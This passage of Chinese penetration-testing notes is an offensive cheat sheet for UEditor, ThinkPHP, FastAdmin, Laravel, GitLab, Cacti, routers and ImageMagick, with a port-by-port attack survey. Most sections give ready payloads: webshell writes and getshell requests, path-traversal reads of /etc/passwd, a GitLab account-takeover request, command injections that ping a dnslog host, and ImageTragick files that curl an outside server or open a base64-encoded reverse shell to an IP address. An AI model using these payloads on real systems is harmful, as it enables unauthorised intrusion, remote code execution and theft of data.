    /ueditor/xxx/controller.php?action=uploadfile
    /ueditor/xxx/controller.php?action=uploadimage
    ```

    数据包

    ```http
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl
    Content-Length: 325
    
    ------WebKitFormBoundary9zWBDx6vAJHGTpAl
    Content-Disposition: form-data; name="upfile"; filename="1.xml"
    Content-Type: image/png
    
    <html>
    <head></head>
    <body>
    <something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(1);
    </something:script>
    </body>
    </html>
    ------WebKitFormBoundary9zWBDx6vAJHGTpAl
    ```
  
    问题

    ![image-20230928150035548](../../../images/image-20230928150035548.png)
  
  - .net下GetShell
  
    > 服务器上存放名为666.jpg的图片马
  
    ```http
    POST /替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
    Host: x.x.x.x
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    sec-ch-ua-platform: "Windows"
    sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
    sec-ch-ua-mobile: ?0
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    
    source[]=http://替换为自己服务器开启http服务的URL地址/666.jpg?.aspx
    ```
  



### 帆软

[安全漏洞声明- FineReport帮助文档 - 全面的报表使用教程和学习资料](https://help.fanruan.com/finereport/doc-view-4833.html)

能够作为致远OA的组件

- 帆软V8

  [奇安信攻防社区-帆软报表 V8.0 组合拳漏洞分析及复现](https://forum.butian.net/share/2390)

  [帆软报表组合拳漏洞分析](https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483675&idx=1&sn=3a6d8544cf5d4396b21d49ab91bd59bf&chksm=cf2e4a0cf859c31ab0703576966a1c46dd565e29cacd3fba3116ba3684923b80286ea1041e31&scene=126&sessionid=1647656066&subscene=207&key=b58103fa9e1debe406843de4e261019a638ff6adb409cef53de99d6db836986a2d16232425a37f1e3d56c18d1c08821da5713530b2aa9646cfd37bece4f874cf51cf11dcb88ca80a05286826a662b7f6515c8ad6fc7c01517ac5ab3996de95d328bd72fda95f86dbbdbb37765685dc68733dca335ff43cb90e04a003d38c1869&ascene=0&uin=MTM1NzU2MDQ1OQ%3D%3D&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&exportke)

  [帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757 - Vuls Wiki](https://vuls.info/PeiQi/wiki/oa/帆软OA/帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757/#_4)

  [FineReport（帆软）报表系统目录遍历漏洞复现和用简易过滤器处理 - 灰信网（软件开发博客聚合）](https://www.freesion.com/article/1056237571/)

  ![img](../../../images/image)

  ![image-20230731170236076](../../../images/image-20230731170236076.png)

- 帆软V9

  [帆软（FineReport) V9任意文件覆盖漏洞 - 先知社区](https://xz.aliyun.com/t/9578)

- 帆软V10

  反序列化
  
  ```
  webroot/decision/remote/design/channel
  ```
  
  





```
# 路径
WebReport/ReportServer
```





### Blade-X

图标

![favicon](../../../images/favicon.png)

[奇安信攻防社区-spring-blade SQL注入漏洞 (butian.net)](https://forum.butian.net/share/1089)

[转载：SpringBlade框架JWT认证缺陷漏洞CVE-2021-44910 - 掘金 (juejin.cn)](https://juejin.cn/post/7194311491175055418)





### ThinkPHP

代码审计之tp各版本链子调式随笔 - 先知社区
http://xz.aliyun.com/t/14038?time__1311=eqIxBDyD07G%3DYiKitD%2FWn2b8QiqqAKD8YeD#toc-28

- debug模式下

  - 敏感变量泄漏：比如数据库的账密

  - 日志泄漏（这个感觉比较多）

    ```shell
    # 默认日志名为year_month_day.log
    /Application/Runtime/Logs/app_name/日志名
    /Runtime/Logs/app_name/日志名
    
    # 其他碰见过的日志名
    day.log
    /year/month/day.log
    ```

  - 找登录日志进后台

  - 观察sql语句进行SQL注入

  - cache文件getshell <= 5.10

    > 缓存文件：网站为了实现加速访问，会将用户访问过的页面存入缓存来减小数据库查询的开销
    >
    > 可能需要通过日志找到cache文件的命名方式

    默认情况下

    ```php
    # 漏洞形成点
    Cache::set("name",$value,3600); # set(缓存标识，缓存值，缓存保留时间)
    $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
    
    # payload
    $data="%0a%0dphpinfo();//"
    
    # 生成的缓存文件位置
    /runtime/cache/MD5(name)前两位/MD5(name)后30位.php
    ```

- 文件读取

  ```http
  ?s=index/\think\Lang/load&file=/etc/passwd
  ```

- 反序列化

  Thinkphp5 RCE总结 - Y4er的博客
  https://y4er.com/posts/thinkphp5-rce/#5010
  
  关键是找好路由，默认是以./public/index.php作为入口文件，但是很多都是二开，入口文件不一样
  
  ![image-20230822212120431](../../../images/image-20230822212120431.png)
  
- ThinkPHP<6.0.13，多语言模块写🐎（这个漏洞的知识点在CTF中出现过很多次，因为docker下的PHP环境默认满足以下前提条件）

  前提条件：

  1. PHP环境开启了`register_argc_argv`
  2. PHP环境安装了pcel/pear

  payload

  ```shell
  ?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['a']);?>+/var/www/html/a.php
  ```

  > 记得在burp中发送，否则浏览器会将<编码导致无法解析

- 相关文章

  一次实战中对tp5网站getshell方式的测试 - 先知社区
  https://xz.aliyun.com/t/10397?u_atoken=bd39fa3f-27e6-48c8-8b24-0914f7d52cea&u_asession=0107aUPLH02VyMq5l2bQ1rJqxO9w09bZdhtwpo-LcXEMlexgaezyHFq8YP73UBF0dHxb7w_ePXHSZCYxDkbgVwRtsq8AL43dpOnCClYrgFm6o&u_asig=05TLfL3h27z5sjRpO60Xhk4KJy4jzYas6TL5hoa3TC-XZZ7_Qqh-xR721_HDl1HXsWX6duFq3DEUnpjEdBOtUxCt_3Ro2HyeedXcyLFtm4EAFaXTgQSh0_yThH-4s10MXVrLloBgFgEDzkpHBSzONvZW_dqCVdL-mrGHvozk4u6EzaKUxtB9OnxETkEKIRw6I4ksmHjM0JOodanL5-M1Qs1RNYVI7Zx8cse5jmZICjbJo1odU9NAP3CLNgLKXD3WsYJ9teUCXjKpGfDlN67LYSUPcOlfkLn0Wijfp9ix1RLDLUpLHxH1iRKZmnjAu0Zefw&u_aref=PM9yMaut3%2FM9WTgVfiEQMWW6YX0%3D
  
  奇安信攻防社区-Thinkphp5-rce-过宝塔小思路
  https://forum.butian.net/index.php/share/1121
  
  

### Thinkphp二开框架

#### hisiphp

从 hisiphp 中 getshell - 火线 Zone-安全攻防社区
https://zone.huoxian.cn/d/2726-hisiphp-getshell

Hisiphp代码审计后台getshell_hisiphp 漏洞-CSDN博客
https://blog.csdn.net/qq_18193739/article/details/132765176

csrf and xss Vulnerability · Issue #3 · hisiphp/hisiphp
https://github.com/hisiphp/hisiphp/issues/3

#### ThinkAdmin

https://www.t00ls.com/viewthread.php?tid=68505&amp;highlight=thinkadmin



#### FastAdmins

```
admin.php/index/login
```

框架特征

![image-20230913172616785](../../../images/image-20230913172616785.png)

![image-20230724153102913](../../../images/image-20230724153102913.png)

![image-20230805193921798](../../../images/image-20230805193921798.png)

框架了解

FastAdmin在线演示,FastAdmin插件演示 – 基于ThinkPHP和Bootstrap的极速后台开发框架
https://www.fastadmin.net/demo.html



渗透姿势

ThinkPHP 5日志文件包含trick - 水泡泡 - 博客园
https://www.cnblogs.com/r00tuser/p/14344922.html

[Fastadmin 漏洞合集 | Caps](https://www.loadcaps.com/posts/2bcc03cb.html)

任意文件读取

```
/index/ajax/lang?lang=../../application/database
```









### Laravel

index.php

![image-20230926145212432](../../../images/image-20230926145212432.png)

报错信息

![image-20230926145157351](../../../images/image-20230926145157351.png)

- debug模式下信息泄漏

  ```http
  使用不允许的请求方法
  或者目录扫描？？？
  .env
  vendor/.env
  lib/.env
  lab/.env
  cronlab/.env
  cron/.env
  core/.env
  core/app/.env
  core/Database/.env
  database/.env
  config/.env
  assets/.env
  app/.env
  apps/.env
  uploads/.env
  sitemaps/.env
  site/.env
  admin/.env
  web/.env
  public/.env
  en/.env
  tools/.env
  v1/.env
  administrator/.env
  laravel/.env
  ```

- 任意用户登录<8.23

  ```http
  content-type:application/json
  
  {"username":[0,0],"password":"1"}
  ```
  
- NDay

  [Laravel Debug mode RCE（CVE-2021-3129）分析复现 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9030)



#### CVE-2018-15133

- Laravel framework 5.5.x<=5.5.40，Laravel framework 5.6.x<=5.6.29
- 需要知道app_key（debug模式下的base64字符串）

[aljavier/exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com)](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

```bash
python pwn_laravel.py url App_key -c command 
或者-i进入交互模式
```

遇到的问题

- 爆破后台时，状态码全为419

  Laravel为了防止跨域攻击会有一个CSRF-TOKEN，如果Token过期了，发起的请求就会都是419状态码，需要重新获取CSRF-TOKEN



xss刷洞

```
/_ignition/scripts/--><svg onload=alert('momika233')>
```





### GitLab

- nmap版本判断

  https://github.com/righel/gitlab-version-nse/

- 目录穿越读取文件--CVE-2023-2825--实际利用感觉挺难的

  前提条件：

  ```
  gitlab-ee/ce == 16.0.0
  
  存在可以达到根⽬录的嵌套可公开访问到的group项⽬⽽且存在附件(issus 评论等)
  或普通⽤户权限⼿动创建多层group和项⽬
  ```

  payload

  ```http
  # 123为issue标题，uploads/dde0c86647fa452e76b94c9588d7fcbb为附件所在目录
  http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
  ```

- SSRF

  [CVE-2021-22214 GITLAB SSRF 未授权漏洞-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/271555)

- RCE

  [gitlab未授权RCE（CVE-2021-22205）漏洞复现及深入利用-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/259862#h2-0)

- 信息泄漏（鸡肋）

  ```http
  POST /api/graphql
  
  # 用户名
  {"query":"{users{edges{node{username,email}}}}"}
  
  # 用户名，邮箱，头像信息
  {"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
  ```

- 任意用户接管漏洞--CVE-2023-7028

  GitLab在重置密码时，可以传入数组作为email，攻击者将自己的邮箱加入数组中，可以让GitLab在重置密码时将邮件发给数组里的所有用户。

  ```
  user[email][]=my.target@example.com&user[email][]=hacker@evil.com
  ```

  



### Gitblit

![image-20230922191132957](../../../images/image-20230922191132957.png)

代码仓库可以直接`git clone`。。。

- Gitblit 1.9.3

  目录遍历

  ```
  /resources//../WEB-INF/web.xml
  ```





### 若依

[若依漏洞 | Khaz (fgtbnc.github.io)](https://fgtbnc.github.io/2023/06/21/若依漏洞复现/)

遇到的问题

- 用户凭证（工具是cookie，但是遇到的很多都是JWT的）
- 定时任务处的过滤



### Phpstudy

指纹

```http
response的Server：Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
```

集成环境

```
nginx解析漏洞
phpmyadmin目录
```

[【漏洞复现】phpStudy 小皮 Windows面板 RCE漏洞_phpstudy 漏洞_李火火安全阁的博客-CSDN博客](https://blog.csdn.net/weixin_46944519/article/details/128954060)



### shiro

[shiro漏洞 | Khaz (fgtbnc.github.io)](https://fgtbnc.github.io/2023/05/01/shiro漏洞/)



### 海康威视  

【漏洞总结】海康威视八大漏洞汇总
https://mp.weixin.qq.com/s/khra2Z6U57kktxGooUEu-A

- **海康威视IP Camera**

  ![image-20240204153336070](../../../images/image-20240204153336070.png)

- Isecure Center综合安防管理平台任意文件上传

  ![iSecure-Center](../../../images/iSecure-Center.png)

- iVMS-5000,iVMS-8700任意文件上传

  ![image-20230826111722216](../../../images/image-20230826111722216.png)

  

### Jenkins

https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/



### Struct2

`OGNL`表达式注入

```
# 关键函数
Ognl.getValue()
```

测试OGNL表达式`${233*233}`，如果页面回显`233*233`的结果，则存在OGNL表达式解析。

| 漏洞名称 |                     注入点                     |            影响版本            |
| :------: | :--------------------------------------------: | :----------------------------: |
|  S2-061  |                                                |        2.0.0 -  2.5.25         |
|  S2-045  |                  Content-Type                  | 2.3.5 - 2.3.31， 2.5 -  2.5.10 |
|  S2-046  | 文件上传的filename值位置，并需要使用`\x00`截断 | 2.3.5 - 2.3.31， 2.5 -  2.5.10 |

```
S2-005
S2-008
S2-009
S2-013
S2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)
S2-019
S2-020
S2-devmode
S2-032
S2-033
S2-037
S2-045
S2-046
S2-048
S2-052
S2-053
S2-057
```





### JBOSS

> JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，**一般与Tomcat或 Jetty绑定使用**。

[奇安信攻防社区-Jboss渗透合集](https://forum.butian.net/share/504)

![image-20230830142620222](../../../images/image-20230830142620222.png)

![image-20230830142653114](../../../images/image-20230830142653114.png)





### typecho

![image-20241020212718091](..\..\source\images\image-20241020212718091.png)

后台路径https://www.03sec.com/Reprinted/typechoxiu-gai-hou-tai-lu-jing-liu-xia-de-lou-dong.html

后台修改文章php文件直接getshell

Typecho反序列化漏洞分析 https://xz.aliyun.com/t/9428





# 端口渗透

![beepress-image-187604-1663914501 (1)](../../../images/beepress-image-187604-1663914501.png)





## 协议类

### FTP-20/21

**介绍**

应用层协议，用于文件传输

- 端口21

  用于FTP的**控制连接**，用于建立和维护FTP会话。客户端通过该端口与服务器进行通信，发送命令和接收响应。

- 端口20

  用于FTP的**数据连接**，用于在客户端和服务器之间传输数据。例如，当需要上传或下载文件时，数据将通过端口20进行传输。

**存在的风险**

- anonymous匿名访问，弱口令，从而可以任意访问文件



### SSH-22

**介绍**

用于连接远程服务器，使用公钥算法进行通信

**存在的风险**

- 上传公钥getshell
- 弱口令getshell
- ssh后门权限维持



### Telent-23

**介绍**

跟ssh作用相同，但是是明文通信很不安全，已被ssh代替

**存在的风险**

- 网络嗅探，获取敏感信息
- 判断TCP协议是否出网



### SMTP/SMTPS-25/465

**介绍**

应用层协议，用于邮件的发送

**存在的风险**

- 未授权访问/弱口令，从而可以发送钓鱼邮件



### DNS-53

**介绍**

应用层协议，用于将域名解析为IP地址或者进行反向解析。

**存在的风险**

- DNS欺骗
- DNS缓存投毒
- 拒绝服务攻击
- 域传送



### POP3-110

**介绍**

应用层协议，用于从邮件服务器上下载电子邮件到本地客户端。

**存在的风险**

- 明文传输
- 邮件劫持



### IMAP-143

**介绍**

应用层协议，允许用户在邮件服务器上管理和检索电子邮件。

**存在的风险**

同POP3







### Rsync-893

**介绍**

`Rsync`是`Linux`下的一款数据备份工具，支持通过`rsync`协议、`ssh`协议进行远程文件传输（但不支持两台远程计算机之间的同步）。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。

**存在的风险**

其中`rsync`协议默认监听`873`端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了`rsync`服务，并且没有配置`ACL`或访问密码，我们将可以读写目标服务器文件。

- 查看 rsync 守护程序分配的所有 module 列表

  ```shell
  rsync rsync://IP:873
  ```

- 下载文件或目录到本地

  ```
  rsync -avz ip://xxx/secret /root/secret
  ```

- 上传文件到服务器

  ```
  rsync -avz webshell.php ip://web/
  ```

**修复**

rsync默认的配置文件`/etc/rsyncd.conf`

```
motd file -> motd文件位置
log file -> 日志文件位置
path -> 默认路径位置
use chroot -> 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录
read only -> 只读配置（yes or no）
list=true -> 是否可以列出模块名
uid = root -> 传输使用的用户名
gid = root -> 传输使用的用户组
auth users -> 认证用户名
secrets file=/etc/rsyncd.passwd -> 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password
hosts allow=192.168.0.101  -> 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开
hosts deny 禁止的主机，host的两项可以使用*表任意。
```



### SMB-445/139

SMB（Server Message Block）服务是一种网络文件共享协议，主要用于局域网内的文件共享、打印机共享和其他网络资源的访问。SMB协议广泛用于Windows操作系统，但现在也支持Linux和macOS。

基本操作

```shell
smbclient -L Host -N  // 匿名访问
smbclient //192.168.1.100/shared -U username  // 指定用户登录
smbclient //192.168.1.100/shared -U DOMAIN/username // 域认证登录
```

```shell
// 非交互模式
smbclient //192.168.1.100/shared -U username -c "command"

// 交互模式
ls // 列文件
get "filename" //下载文件
put localfile remotefile // 上传文件
mkdir dirname // 创建目录
del filename // 删除文件
exit // 退出
```

![image-20241120201707318](../..\source\images\image-20241120201707318.png)

- CVE-2020-0796 SMBGhost





### WinRM-5985/5986

**WinRM（Windows远程管理）** 是一种Windows操作系统中的协议和服务，基于 **WS-Management（Web服务管理协议）** 标准。它用于通过HTTP或HTTPS进行远程管理和系统配置。





## 数据库类

### MSSQL-1433

关系型数据库

### Oracle-1521

### Mysql-3306

### PostgreSQL-5432

### Reidis-6379

### MongoDB-27017

非关系型数据库

- 弱口令
- 未授权访问
- NoSql注入



### Access-无端口号

Access数据库属于文件型数据库，所以不需要端口号。

在Office 2007之前的Access数据库文件的后缀是 .mdb ，Office2007及其之后的Access数据库文件的后缀是 .accdb 



## Web服务类

### Weblogic-7001

### JBOSS-8080

### Jenkis-8080

![image-20230925173219085](../../../images/image-20230925173219085.png)

![image-20230925173151794](../../../images/image-20230925173151794.png)

### Zabbix-10051

> zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中**web模块由PHP编写**，用来显示数据库中的结果。

[Zabbix 攻击面挖掘与利用 (seebug.org)](https://paper.seebug.org/1697/#zabbix-agent)

未授权访问

```
/zabbix.php?action=problem.view&ddreset=1
/overview.php?ddreset=1
/srv_status.php?ddreset=1
/latest.php?ddreset=1
```

[bylibrary/docs/漏洞库/01-CMS漏洞/zabbix at main · BaizeSec/bylibrary (github.com)](https://github.com/BaizeSec/bylibrary/tree/main/docs/漏洞库/01-CMS漏洞/zabbix)

- sql注入
- 后台创建脚本getshell

[CVE-2022-23131：Zabbix SSO认证绕过漏洞 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/179601.html)

[CVE-2020-11800 zabbix RCE漏洞细节披露 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8991)

- 进入后台启自动注册功能

- exp获取server端（exp需要在zabbix所在的服务器上运行）

  ```
  python exp.py 127.0.0.1 cmd
  ```

  

### 宝塔-8888

```
/pma
```

### Solr-8983

```
/solr/admin
```

[Apache Solr <= 8.8.1任意文件读取漏洞复现-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1812009)



### Docker-Remote-API-2375

[Docker 远程 API 未授权访问逃逸 | T Wiki (teamssix.com)](https://wiki.teamssix.com/cloudnative/docker/docker-remote-api-unauth-escape.html)

### Docker Registry-5000

### RabbitMQ-15672、15692、25672

弱口令guset/guest



## 远程桌面

### RDP-3389





# 设备

![image-20241122232431014](C:\Users\yanzu\AppData\Roaming\Typora\typora-user-images\image-20241122232431014.png)

## Vmware

W01fh4cker/ScreenConnect-AuthBypass-RCE: ScreenConnect AuthBypass(cve-2024-1709) --> RCE!!!
https://github.com/W01fh4cker/ScreenConnect-AuthBypass-RCE





## 路由器

## 飞星鱼路由器

```http
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
{"opid":"1","name":";id;","type":"rest"}
```



## cacti

> cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具

![image-20231229173014673](../../../images/image-20231229173014673.png)

CVE-2022-46169

```http
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`ping%20e2y29y.dnslog.cn`

X-Forwarded-For: 127.0.0.1
```

Unauthenticated SQL Injection when viewing graphs · Advisory · Cacti/cacti
https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg

CVE-2020-8813-Cacti-v1.2.8-远程命令执行漏洞 - Cacti
https://www.hacking8.com/bug-product/Cacti/CVE-2020-8813-Cacti-v1.2.8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

漏洞预警 | Cacti文件包含和SQL注入漏洞 | CN-SEC 中文网
https://cn-sec.com/archives/2342658.html





# 组件

## Imagetragick 

### 原理

ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行，漏洞发生的地方：

```shell
<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;"/>
```

它在解析https图片的时候，使用了curl命令将其下载，这里定义了一些占位符，如%o是curl输出的文件名，%M是远程的URL路径。注意到command中的可以到%M是可以拼接其他指令并被在命令行中执行的。该漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。也就是下面这样：

```shell
command=" "curl" -s -k -o "%o" "https:%M" "/>
```

当%M为：https://"|id && ls -al /etc/passwd"

```shell
command=" "curl" -s -k -o "%o" "https://"|id && ls -al /etc/passwd"" "/>
```

### payload

上传的图片内容

- **CVE-2016-3714**--**命令执行**

  ```shell
  # http请求
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
  pop graphic-context
  
  # 反弹shell
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`"||id " )'
  pop graphic-context
  ```

- **CVE-2016-3715**--**任意删除文件**

  ```shell
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
  pop graphic-context
  ```

- **CVE-2016-3716**--**任意文件写入**

  > msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作

  ```shell
  先上传一个图片马1.png和msl.xml
  # msl.xml内容，1.png重命名为shell.php
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="1.png" />
  <write filename="shell.php" />
  </image>
  
  再上传exp图片
  -=-=-=-=-=-=-=-=-
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'msl:msl.xml'
  pop graphic-context
  ```

- CVE-2016-3717--任意文件读取

  ```php
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'label:@/etc/hosts'
  pop graphic-context$ convert file_read.mvg out.png # produces file with text rendered from/etc/passwd
  ```

  

  

  

  

  

  

  

​	



